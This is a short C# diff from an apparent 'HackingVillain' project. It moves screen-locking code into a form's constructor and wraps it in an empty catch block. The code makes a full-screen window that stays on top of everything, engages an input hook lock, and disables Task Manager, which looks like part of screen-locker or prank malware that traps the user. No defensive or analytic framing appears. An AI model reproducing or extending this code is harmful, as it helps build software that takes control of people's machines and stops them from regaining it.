@@ -20,24 +20,15 @@ namespace HackingVillain
             InitializeComponent();
             _hook = hook;
 
-            this.Size = new Size(10000, 10000);
-            this.TopMost = true;
-        }
-
-        protected override void OnShown(EventArgs e)
-        {
-            base.OnShown(e);
-
-            _hook.Lock();
-            TaskManager(false);
-            TopMostAlways.SetTopmost(this.Handle);
-            /*
-            this.Invoke(new MethodInvoker(() =>
+            try
             {
-                System.Threading.Thread.Sleep(3000);
-                Fuck();
-            }));
-            */
+                this.Size = new Size(10000, 10000);
+                this.TopMost = true;
+                _hook.Lock();
+                TaskManager(false);
+                TopMostAlways.SetTopmost(this.Handle);
+            }
+            catch { }
         }
 
         /// <summary>
